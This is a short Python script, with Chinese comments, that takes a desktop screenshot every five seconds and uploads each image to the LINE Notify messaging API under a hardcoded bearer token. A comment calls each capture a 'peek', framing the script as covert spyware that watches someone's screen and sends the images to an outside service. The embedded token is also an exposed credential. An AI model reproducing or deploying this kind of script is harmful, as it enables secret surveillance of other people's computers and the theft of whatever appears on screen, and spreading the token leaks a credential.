import pyautogui, time
import requests

i = 1

while True:

    pyautogui.screenshot('screenshot-'+ str(i) +'.png') # 自動截圖
    print('screenshot-'+ str(i) +'.png SAVED!.')
    
    headers = {
            "Authorization": "Bearer " + "W4KdI7RuXBnNZBkPk3hK5var60vrzw10AgAGp48i16w",
        }
     
    params = {"message": "success",  # 傳訊息，這邊設定傳success
    }
    
    files = {'imageFile': open(r'screenshot-'+ str(i) +'.png','rb')} # 傳圖片檔案

    r = requests.post("https://notify-api.line.me/api/notify",
                      headers=headers, params=params, files = files)
                      
    time.sleep(5) #看你要幾秒鐘偷窺一次
    i = i + 1